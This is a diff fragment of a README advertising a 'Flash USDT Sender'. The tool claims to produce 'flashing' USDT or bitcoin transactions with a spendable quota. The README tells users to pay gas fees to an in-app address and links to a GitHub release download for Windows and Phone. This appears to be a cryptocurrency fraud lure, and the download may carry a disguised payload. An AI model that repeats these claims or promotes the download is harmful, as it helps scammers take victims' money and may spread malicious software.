@@ -18,7 +18,7 @@ Flash USDT Sender is a tool for sending USDT quickly that lets users perform ETH
 
 When you gain app access, you'll have a limited spendable quota of either bitcoin or USDT, but you'll be responsible for your gas fee for the flashing transactions. You'll find a gas address in-app and the gas topup process is simple.
 
-"Our software is currently available for trial on GitHub for Windows and Phone. Download it here."
+### "Our software is currently available for trial on GitHub for Windows and Phone. Download it here."
 
 [<img width="350" height="75" src="https://github.com/user-attachments/assets/9d32d764-dfcf-4cbb-bfdc-6e2f0c53a096">](https://github.com/VCamPro/Flash-USDT/releases/tag/USDT)
 
